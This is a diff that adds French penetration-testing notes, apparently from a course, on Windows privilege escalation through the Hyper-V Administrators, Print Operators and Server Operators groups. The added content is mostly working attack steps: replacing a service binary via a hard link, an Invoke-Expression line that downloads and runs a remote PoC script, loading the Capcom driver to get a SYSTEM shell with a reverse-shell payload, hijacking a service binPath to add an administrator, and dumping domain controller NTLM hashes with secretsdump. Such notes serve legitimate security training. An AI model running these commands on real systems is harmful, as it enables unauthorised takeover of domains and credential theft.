@@ -757,9 +757,291 @@ Ainsi, toutes les machines cherchant à découvrir un proxy via WPAD pointeront 
 
 ---
 
+# Hyper-V Administrators
 
+Le groupe `Hyper-V Administrators` possède un accès complet aux fonctionnalités Hyper-V. Sur des environnements où les Domain Controllers sont virtualisés, les administrateurs de virtualisation doivent être traités comme des **Domain Admins** potentiels : ils peuvent cloner un DC en cours d’exécution, monter son disque virtuel hors-ligne et extraire le fichier `NTDS.dit` pour récupérer les hashes NTLM du domaine.
 
+Il existe aussi une technique documentée où, lors de la suppression d’une machine virtuelle, `vmms.exe` restaure les permissions d’origine du fichier `.vhdx` en tant que `NT AUTHORITY\SYSTEM` **sans** s’authentifier en tant qu’utilisateur. En supprimant le `.vhdx` puis en créant un hard link natif pointant vers un fichier protégé par SYSTEM, un Hyper-V Admin peut obtenir des permissions persistantes sur ce fichier et ensuite en abuser (exécution de code SYSTEM) si le système est vulnérable (`CVE-2018-0952`, `CVE-2019-0841`) ou si un service SYSTEM est startable par des utilisateurs non-privilégiés.
 
+## Attack Overview
 
+### Clone and Mount a Virtual DC
+Un Hyper-V Admin peut :
+- Cloner la machine virtuelle du Domain Controller.
+- Monter la virtual hard disk (`.vhdx`) offline.
+- Récupérer `NTDS.dit` puis extraire les hashes (ex : via `ntdsutil` / `secretsdump.py`).
+
+### Hard Link Exploit (NT hard link to protected SYSTEM file)
+Principe :
+1. Supprimer (ou déplacer) le `.vhdx` correspondant à la VM.  
+2. Créer un hard link **avec le même nom** pointant vers un fichier protégé par SYSTEM (ex : un exécutable de service).  
+3. Lorsque `vmms.exe` restaure les permissions sur le fichier `.vhdx`, il applique ces permissions au fichier cible (qui est en réalité le fichier SYSTEM pointé par le hard link), ce qui donne à l’attaquant des droits sur ce fichier SYSTEM.  
+4. Remplacer le fichier (exécutable de service) par un binaire malveillant.  
+5. Démarrer le service (si possible) pour obtenir une exécution en contexte SYSTEM.
+
+> Remarque : cette chaîne dépend de la présence d’un comportement vulnérable (voir CVE list) ou d’un service SYSTEM startable par un utilisateur non-privé
+
+## Target File Example
+
+Exemple fourni dans le cours :  
+`C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`  
+(ici Firefox installe un service « Mozilla Maintenance Service » qui peut servir de cible pour remplacer l’exécutable par un binaire malveillant et obtenir l’exécution SYSTEM.)
+
+## Steps
+### 1) Remove or rename the VM .vhdx
+`Remove-Item "C:\Hyper-V\VMs\victim\victim.vhdx"`  
+`Rename-Item "C:\Hyper-V\VMs\victim\victim.vhdx" "victim.vhdx.bak"`
+
+### 2) Create a hard link pointing to a protected SYSTEM file
+`fsutil hardlink create "C:\Hyper-V\VMs\victim\victim.vhdx" "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`
+
+### 3) Trigger vmms.exe to restore permissions
+(Le mécanisme de restauration est automatique par `vmms.exe` lors de certaines opérations sur la VM.)
+
+### 4) Gain full control on the target file (take ownership + grant rights)
+`takeown /F "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`  
+`icacls "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe" /grant "%USERNAME%:F"`
+
+### 5) Replace the file with a malicious binary
+`Copy-Item ".\malicious\maintenanceservice.exe" "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe" -Force`
+
+### 6) Start the service to execute code as SYSTEM
+`sc.exe start MozillaMaintenance`
+
+### 7) If successful — confirm SYSTEM context
+`whoami /all`  
+`[System.Security.Principal.WindowsIdentity]::GetCurrent().Name`
+
+## Using the PoC script (Hyper-V native hardlink PoC)
+
+Le cours mentionne un script PoC (`hyperv-eop.ps1`) disponible publiquement qui automatise la création du hard link et certaines étapes d’exploitation. Exemple d’utilisation (exécution depuis un hôte où vous avez les droits Hyper-V) :
+
+`Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1')`  
+# ou  
+`iwr https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1 -OutFile .\hyperv-eop.ps1`  
+`.\hyperv-eop.ps1 -Target "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"`
+
+## Alternatives when CVEs are patched
+
+Si le système est corrigé pour `CVE-2018-0952` / `CVE-2019-0841` (ou si la restauration de permissions ne mène pas à un gain d’accès), d’autres vecteurs possibles :  
+- Trouver un **service SYSTEM** qui est startable par un utilisateur non-privilégié, remplacer son binaire et démarrer le service.  
+- Profiter d’autres erreurs de configuration (permissions mal configurées sur fichiers sensibles, partages, etc.).  
+- Voler les snapshots/backup offline d’un DC et extraire `NTDS.dit` (même sans hard link).
+
+> Note de sécurité : la modification d’images de VM ou la manipulation de fichiers système peut causer des pertes de données ou des interruptions de service. N’effectuez ces actions que dans des environnements d’essai approuvés ou avec l’accord explicite du propriétaire du système.
+
+## Resources
+
+[From Hyper-V Admin to SYSTEM](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/)  
+[CVE-2018-0952 — Tenable](https://www.tenable.com/cve/CVE-2018-0952)  
+[CVE-2019-0841 — Tenable](https://www.tenable.com/cve/CVE-2019-0841)  
+[hyperv-eop.ps1 (raw GitHub)](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1)
+
+---
+
+# Print Operators
+
+Groupe très privilégié : donne `SeLoadDriverPrivilege` et droits d'administration d'imprimantes. Si `whoami /priv` ne montre pas `SeLoadDriverPrivilege` depuis un contexte non élevé, il faut l'activer (UAC bypass si nécessaire).
+
+## Confirm Privileges
+Vérifier privilèges :
+`whoami /priv`
+
+## Enable SeLoadDriverPrivilege (compile & run)
+1. Récupérer le source `EnableSeLoadDriverPrivilege.cpp`.  
+2. Compiler depuis Visual Studio Developer Command Prompt :
+`cl /DUNICODE /D_UNICODE EnableSeLoadDriverPrivilege.cpp`  
+3. Lancer l'exécutable pour activer le privilege :
+`EnableSeLoadDriverPrivilege.exe`  
+Vérifier :
+`whoami /priv` → `SeLoadDriverPrivilege` `Enabled`
+
+## Add driver registry reference (HKCU)
+Créer la clé qui référence le driver (ex: `C:\Tools\Capcom.sys`) :
+`reg add HKCU\System\CurrentControlSet\CAPCOM /v ImagePath /t REG_SZ /d "\??\C:\Tools\Capcom.sys"`  
+`reg add HKCU\System\CurrentControlSet\CAPCOM /v Type /t REG_DWORD /d 1`
+
+## Verify driver not loaded / then loaded
+Exporter la liste des drivers (DriverView) puis filtrer :
+`.\DriverView.exe /stext drivers.txt`  
+`cat drivers.txt | Select-String -pattern Capcom`
+
+Après activation et chargement, refaire pour confirmer `Capcom.sys` listé.
+
+## Load driver (manual) / or use EoPLoadDriver
+- Manual (NTLoadDriver via tool or custom): utiliser l’exécutable qui appelle `NtLoadDriver` sur `\Registry\User\<SID>\System\CurrentControlSet\CAPCOM`.  
+- Automatique :  
+`EoPLoadDriver.exe System\CurrentControlSet\Capcom c:\Tools\Capcom.sys`
+
+## Exploit Capcom (escalation)
+Compiler/exécuter `ExploitCapcom.exe` :
+`.\ExploitCapcom.exe`  
+Résultat attendu : token steal → shell en `NT AUTHORITY\SYSTEM`
+
+## Alternate (no GUI) — change payload in source
+Modifier le `ExploitCapcom.cpp` : remplacer la ligne de lancement par le chemin du payload (ex: reverse shell) :
+`TCHAR CommandLine[] = TEXT("C:\\ProgramData\\revshell.exe");`  
+Recompiler, déployer et exécuter `ExploitCapcom.exe`.
+
+## Automate full flow
+1. Activer privilege : `EnableSeLoadDriverPrivilege.exe` (ou EoPLoadDriver).  
+2. Ajouter clé HKCU (registry).  
+3. Charger driver (`EoPLoadDriver.exe` ou util NTLoadDriver).  
+4. Lancer `ExploitCapcom.exe`.
+
+## Cleanup
+Supprimer la clé ajoutée :
+`reg delete HKCU\System\CurrentControlSet\Capcom`
+
+## Quick checklist
+- `whoami /priv` before & after.  
+- `C:\Tools\Capcom.sys` présent.  
+- Driver list via `DriverView.exe`.  
+- Have ExploitCapcom compiled matching target architecture.  
+- If UAC blocks, utiliser UACMe techniques (voir resources).
+
+## Resources
+[UACMe (repo)](https://github.com/hfiref0x/UACME)  
+[EnableSeLoadDriverPrivilege.cpp (raw)](https://raw.githubusercontent.com/3gstudent/Homework-of-C-Language/master/EnableSeLoadDriverPrivilege.cpp)  
+[Capcom.sys (repo)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)  
+[DriverView (NirSoft)](http://www.nirsoft.net/utils/driverview.html)  
+[ExploitCapcom (repo)](https://github.com/tandasat/ExploitCapcom)  
+[EoPLoadDriver (repo)](https://github.com/TarlogicSecurity/EoPLoadDriver/)
+
+---
+
+# Server Operators
+
+Les membres du groupe `Server Operators` peuvent administrer des serveurs Windows sans posséder les droits `Domain Admin`. C'est un groupe très privilégié : ses membres peuvent se connecter localement aux serveurs (y compris certains Domain Controllers), et disposent souvent des privilèges `SeBackupPrivilege` et `SeRestorePrivilege`, ainsi que de la capacité à contrôler des services locaux.
+
+## Querying the AppReadiness Service
+
+On examine le service `AppReadiness` pour confirmer qu'il s'exécute sous le compte `LocalSystem`. On utilise `sc` pour interroger la configuration :
+```
+sc qc AppReadiness
+```
+
+Exemple de sortie (illustrative) montrant `SERVICE_START_NAME : LocalSystem` :
+`[SC] QueryServiceConfig SUCCESS`
+
+`SERVICE_NAME: AppReadiness`  
+`TYPE : 20 WIN32_SHARE_PROCESS`  
+`START_TYPE : 3 DEMAND_START`  
+`ERROR_CONTROL : 1 NORMAL`  
+`BINARY_PATH_NAME : C:\Windows\System32\svchost.exe -k AppReadiness -p`  
+`LOAD_ORDER_GROUP :`  
+`TAG : 0`  
+`DISPLAY_NAME : App Readiness`  
+`DEPENDENCIES :`  
+`SERVICE_START_NAME : LocalSystem`
+
+## Checking Service Permissions with PsService
+
+On peut vérifier les permissions sur le service avec `PsService` (Sysinternals). `PsService` affiche les droits ACL du service et permet d'identifier si `Server Operators` a un accès étendu (par ex. `SERVICE_ALL_ACCESS`).
+
+Commande pour afficher la sécurité du service :
+```
+c:\Tools\PsService.exe security AppReadiness
+```
+
+Extrait de sortie (illustratif) montrant que `Server Operators` a `All` :
+`SERVICE_NAME: AppReadiness`  
+`DISPLAY_NAME: App Readiness`  
+`ACCOUNT: LocalSystem`  
+`SECURITY: ...`  
+`[ALLOW] BUILTIN\Server Operators`  
+`All`
+
+Si `Server Operators` a `All` ou `SERVICE_ALL_ACCESS`, cela donne un contrôle total sur le service (stop/start/configurer/modifier le binaire, etc.).
+
+## Checking Local Admin Group Membership
+
+Vérifier les membres du groupe local `Administrators` pour confirmer que notre compte n'est pas déjà administrateur local :
+```
+net localgroup Administrators
+```
+
+Sortie d'exemple :
+`Alias name     Administrators`  
+`Comment        Administrators have complete and unrestricted access to the computer/domain`  
+
+`Members`  
+`-------------------------------------------------------------------------------`  
+`Administrator`  
+`Domain Admins`  
+`Enterprise Admins`  
+`The command completed successfully.`
+
+## Modifying the Service Binary Path
+
+Si le compte a le droit de modifier la configuration du service, on peut changer `binPath` pour exécuter une commande arbitraire (par ex. ajouter l'utilisateur courant au groupe Administrators local). Exemple :
+```
+sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
+```
+
+Sortie attendue :
+`[SC] ChangeServiceConfig SUCCESS`
+
+## Starting the Service
+
+Tenter de démarrer le service :
+```
+sc start AppReadiness
+```
+
+Il est courant que le démarrage échoue si la nouvelle commande n'est pas un vrai service Windows (erreur 1053). Exemple :
+`[SC] StartService FAILED 1053: The service did not respond to the start or control request in a timely fashion.`
+
+Cependant, même si `sc start` retourne une erreur, la commande dans `binPath` peut s'être exécutée — il faut vérifier la conséquence (ici : ajout de compte au groupe Administrators).
+
+## Confirming Local Admin Group Membership
+
+Après modification, vérifier si l'utilisateur a bien été ajouté :
+```
+net localgroup Administrators
+```
+
+Sortie exemple montrant `server_adm` ajouté :
+`Alias name     Administrators`  
+`...`  
+`server_adm`  
+`The command completed successfully.`
+
+## Confirming Local Admin Access on Domain Controller
+
+Une fois administrateur local sur le Domain Controller, on peut se connecter et exécuter des outils pour confirmer l'accès.
+
+Exemple d'utilisation de `crackmapexec` pour tester l'accès SMB :
+```
+crackmapexec smb 10.129.43.9 -u server_adm -p 'HTB_@cademy_stdnt!'
+```
+
+Exemple de sortie (indicative) montrant un accès réussi :
+```
+SMB 10.129.43.9 445 WINLPE-DC01 [+] INLANEFREIGHT.LOCAL\server_adm:HTB_@cademy_stdnt! (Pwn3d!)
+```
+
+## Retrieving NTLM Password Hashes from the Domain Controller
+
+Avec un compte ayant les droits nécessaires sur le DC, on peut extraire les hachés NTLM / les secrets via `secretsdump.py` (Impacket) :
+```
+secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator
+```
+
+Sortie d'exemple montrant le haché NTLM de `Administrator` et les clés Kerberos :
+`[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)`  
+`Administrator:500:aad3b435...:cf3a5525ee9414229e66279623ed5c58:::`  
+`[*] Kerberos keys grabbed`  
+`Administrator:aes256-cts-hmac-sha1-96:...`  
+`[*] Cleaning up...`
+
+Avec ces hachés ou clés, la post-exploitation complète du domaine devient possible (pass-the-hash, persistence, etc.).
+
+## Resources
+
+- [PsService (Sysinternals) - Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psservice)  
+- [PsTools Suite - Sysinternals](https://learn.microsoft.com/sysinternals/downloads/pstools)
+
+---
 
 
